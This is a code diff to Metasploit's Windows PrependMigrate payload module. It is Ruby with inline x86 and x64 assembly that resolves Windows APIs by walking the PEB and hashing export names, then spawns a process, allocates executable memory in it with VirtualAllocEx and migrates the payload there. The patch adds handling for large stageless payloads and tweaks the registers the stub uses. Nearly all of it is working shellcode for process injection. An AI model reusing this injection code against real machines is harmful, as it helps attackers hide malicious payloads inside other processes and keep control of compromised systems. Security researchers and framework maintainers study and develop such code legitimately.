@@ -28,13 +28,13 @@ module Msf::Payload::Windows::PrependMigrate
   # for discussion.
   #
   def prepend_migrate?
-    !!(datastore['PrependMigrate'] && datastore['PrependMigrate'].to_s.downcase == 'true')
+    datastore['PrependMigrate']
   end
 
   #
   # Overload the generate() call to prefix our stubs
   #
-  def prepends(buf)
+  def apply_prepend_migrate(buf)
     pre = ''
 
     test_arch = [ *(self.arch) ]
@@ -68,8 +68,8 @@ module Msf::Payload::Windows::PrependMigrate
     api_call:
       pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
       mov ebp, esp              ; Create a new stack frame
-      xor edx, edx              ; Zero EDX
-      mov edx, [fs:edx+48]      ; Get a pointer to the PEB
+      xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
+      mov edx, [fs:eax+48]      ; Get a pointer to the PEB
       mov edx, [edx+12]         ; Get PEB->Ldr
       mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
     next_mod:                   ;
@@ -77,7 +77,6 @@ module Msf::Payload::Windows::PrependMigrate
       movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
       xor edi, edi              ; Clear EDI which will store the hash of the module name
     loop_modname:               ;
-      xor eax, eax              ; Clear EAX
       lodsb                     ; Read in the next byte of the name
       cmp al, 'a'               ; Some versions of Windows use lower case module names
       jl not_lowercase          ;
@@ -92,10 +91,10 @@ module Msf::Payload::Windows::PrependMigrate
       push edi                  ; Save the current module hash for later
       ; Proceed to iterate the export address table
       mov edx, [edx+16]         ; Get this modules base address
-      mov eax, [edx+60]         ; Get PE header
+      mov ecx, [edx+60]         ; Get PE header
 
       ; use ecx as our EAT pointer here so we can take advantage of jecxz.
-      mov ecx, [eax+edx+120]    ; Get the EAT from the PE header
+      mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
       jecxz get_next_mod1       ; If no EAT present, process the next module
       add ecx, edx              ; Add the modules base address
       push ecx                  ; Save the current modules EAT
@@ -113,7 +112,6 @@ module Msf::Payload::Windows::PrependMigrate
       xor edi, edi              ; Clear EDI which will store the hash of the function name
       ; And compare it to the one we want
     loop_funcname:              ;
-      xor eax, eax              ; Clear EAX
       lodsb                     ; Read in the next byte of the ASCII function name
       ror edi, 13               ; Rotate right our hash value
       add edi, eax              ; Add the next byte of the name
@@ -145,7 +143,7 @@ module Msf::Payload::Windows::PrependMigrate
       ; We now automagically return to the correct caller...
 
     get_next_mod:               ;
-      pop eax                   ; Pop off the current (now the previous) modules EAT
+      pop edi                   ; Pop off the current (now the previous) modules EAT
     get_next_mod1:              ;
       pop edi                   ; Pop off the current (now the previous) modules hash
       pop edx                   ; Restore our position in the module list
@@ -242,8 +240,19 @@ module Msf::Payload::Windows::PrependMigrate
       ; allocate memory in the process (VirtualAllocEx())
       ; get handle
       push 0x40                 ; RWX
-      add bh,0x10               ; ebx = 0x1000
+      add bh, 0x10              ; ebx = 0x1000
       push ebx                  ; MEM_COMMIT
+    EOS
+
+    if buf.length > 4096
+      # probably stageless, so we don't have shellcode size constraints,
+      # and so we can just set ebx to the size of the payload
+      migrate_asm << <<-EOS
+      mov ebx, #{payloadsize} ; stageless size
+      EOS
+    end
+
+    migrate_asm << <<-EOS
       push ebx                  ; size
       xor ebx,ebx
       push ebx                  ; address
@@ -447,10 +456,11 @@ module Msf::Payload::Windows::PrependMigrate
       call rbp                  ; GetStartupInfoA( &si );
 
       jmp getcommand
-      gotcommand:
+    gotcommand:
       pop rsi                   ; rsi = address of process name (command line)
 
       ; create the process
+      push 0                    ; keep the stack aligned
       lea rdi,[rsp+0x110]       ; Offset of empty space for lpProcessInformation
       push rdi                  ; lpProcessInformation : write processinfo here
       lea rcx,[rsp+0x58]
@@ -476,7 +486,22 @@ module Msf::Payload::Windows::PrependMigrate
       ; get handle
       push 0x40                 ; RWX
       mov r9,0x1000             ; 0x1000 = MEM_COMMIT
+    EOS
+
+    if buf.length > 4096
+      # probably stageless, so we don't have shellcode size constraints,
+      # and so we can just set r8 to the size of the payload
+      migrate_asm << <<-EOS
+      mov r8, #{payloadsize} ; stageless size
+      EOS
+    else
+      # otherwise we'll juse reuse r9 (4096) for size
+      migrate_asm << <<-EOS
       mov r8,r9                 ; size
+      EOS
+    end
+
+    migrate_asm << <<-EOS
       xor rdx,rdx               ; address
       mov rcx, [rdi]            ; handle
       mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
